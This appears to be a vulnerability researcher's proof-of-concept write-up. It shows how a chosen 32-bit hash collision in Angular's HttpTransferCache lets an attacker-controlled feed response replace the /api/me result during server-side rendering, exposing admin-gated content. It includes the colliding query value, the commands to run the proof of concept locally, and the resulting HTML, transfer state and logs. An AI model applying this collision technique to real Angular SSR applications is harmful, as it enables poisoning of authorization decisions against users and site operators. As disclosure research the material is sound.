# A18 authz poisoning chain

Date: 2026-04-29

## Goal

Escalate the chosen-target 32-bit `HttpTransferCache` collision from wrong-response replay into a
security decision primitive.

The app models a common SSR pattern:

- a page fetches attacker-influenced feed data during SSR;
- the same page fetches `/api/me` during SSR to decide whether admin-only content should render;
- `/api/me` is protected by the inbound user cookie and returns `{role: "user"}` for the victim;
- Angular `HttpTransferCache` is enabled through normal SSR/hydration providers.

The attacker-controlled feed URL was chosen so its Angular transfer-cache key collides with the
fixed `/api/me` key:

```text
GET|json|http://127.0.0.1:4218/feed?x=uibaalzu||
GET|json|http://127.0.0.1:4218/api/me||
StateKey: 2884615638
```

## Command

```bash
cd bugs/angular/a18-transfer-cache-request-variant-confusion/poc/ssr-cookie-app
./node_modules/.bin/tsx server.ts
curl -sS -H 'Cookie: sid=alice' 'http://127.0.0.1:4218/?feed=uibaalzu'
```

## Observed HTML

```html
<div id="authz">feed={"user":"attacker","role":"admin","source":"feed"}|me={"user":"attacker","role":"admin","source":"feed"}|ADMIN_PANEL_SECRET</div>
```

The SSR-rendered page exposed `ADMIN_PANEL_SECRET`, which the component only renders after reading
`role === "admin"` from the `/api/me` response.

The serialized transfer state also shows that the stored value for `StateKey` `2884615638` came from
the attacker-influenced feed URL, not from `/api/me`:

```json
"2884615638":{
  "b":{"user":"attacker","role":"admin","source":"feed"},
  "h":{},
  "s":200,
  "st":"OK",
  "u":"http://127.0.0.1:4218/feed?x=uibaalzu",
  "rt":"json"
}
```

## Observed server log

```text
[express] render url: http://127.0.0.1:4218/?feed=uibaalzu inbound cookie: "sid=alice"
[api] /feed hit 1 query= {"x":"uibaalzu"}
[ssr] feed body: {"user":"attacker","role":"admin","source":"feed"}
[ssr] me body: {"user":"attacker","role":"admin","source":"feed"}
[express] api hit counts profile= 0 me= 0 feed= 1 tenant= 1 collision= 1
```

`/api/me` was never requested from the backend (`me=0`). The trusted `/api/me` consumer received the
attacker-controlled feed body because both URLs resolved to the same 32-bit transfer-cache state key.

## Impact interpretation

This demonstrates an authorization-decision poisoning primitive inside a real Angular SSR runtime:

- the victim request carries `Cookie: sid=alice`;
- the real `/api/me` endpoint would return `role: "user"`;
- the Angular component receives an attacker-controlled `{role: "admin"}` object as the `/api/me`
  result;
- SSR renders admin-gated content based on the poisoned response.

This still does not prove backend authorization bypass. It proves that SSR-rendered authorization or
UI/data decisions that trust an `HttpClient` response can be poisoned when an attacker controls
another SSR-fetched URL/query in the same render boundary and can find a transfer-cache hash
collision.
